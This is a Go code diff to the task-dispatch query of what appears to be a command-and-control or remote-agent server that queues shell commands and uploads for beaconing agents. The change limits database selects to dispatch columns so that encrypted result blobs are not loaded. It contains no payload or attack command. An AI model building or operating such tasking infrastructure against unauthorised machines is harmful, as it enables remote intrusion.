@@ -31,6 +31,12 @@ func (s *Server) fetchPendingTasks(uuid string, limits ...int) []task {
 		return s.db.Transaction(func(tx *gorm.DB) error {
 			var pending []db.Task
 			if err := tx.Clauses(clause.Locking{Strength: "UPDATE"}).
+				// Dispatch columns only. Result/Error blobs (up to MaxResultSize
+				// each) are never sent on the wire, so loading them here wastes
+				// I/O and fires a pointless AfterFind AES-GCM decrypt per row on
+				// every beacon. Command/Data/Shell stay loaded because the wire
+				// builder re-encrypts them with the session key below.
+				Select("id, type, command, shell, path, data, `offset`, size, prev_mac, mac, task_key").
 				Where("agent_id = ? AND status = ?", uuid, "pending").
 				Where("NOT (type = ? AND (mac = '' OR mac IS NULL))", "upload").
 				Order("priority DESC, created_at ASC").
@@ -56,7 +62,7 @@ func (s *Server) fetchPendingTasks(uuid string, limits ...int) []task {
 				if result.RowsAffected < int64(len(ids)) {
 					slog.Debug("Some tasks already claimed by concurrent connection", "agent_id", uuid, "attempted", len(ids), "claimed", result.RowsAffected)
 				}
-				if err := tx.Where("id IN ? AND status = ? AND claimed_by = ?", ids, "running", uuid).
+				if err := tx.Select("id, type, command, shell, path, data, `offset`, size, prev_mac, mac, task_key").Where("id IN ? AND status = ? AND claimed_by = ?", ids, "running", uuid).
 					Order("priority DESC, created_at ASC").Limit(len(ids)).Find(&claimedTasks).Error; err != nil {
 					return err
 				}
@@ -72,7 +78,7 @@ func (s *Server) fetchPendingTasks(uuid string, limits ...int) []task {
 				for _, ct := range claimedTasks {
 					claimedIDs = append(claimedIDs, ct.ID)
 				}
-				q := tx.Where("agent_id = ? AND status = ? AND claimed_by = ? AND acknowledged_at IS NULL", uuid, "running", uuid)
+				q := tx.Select("id, type, command, shell, path, data, `offset`, size, prev_mac, mac, task_key").Where("agent_id = ? AND status = ? AND claimed_by = ? AND acknowledged_at IS NULL", uuid, "running", uuid)
 				if len(claimedIDs) > 0 {
 					q = q.Where("id NOT IN ?", claimedIDs)
 				}
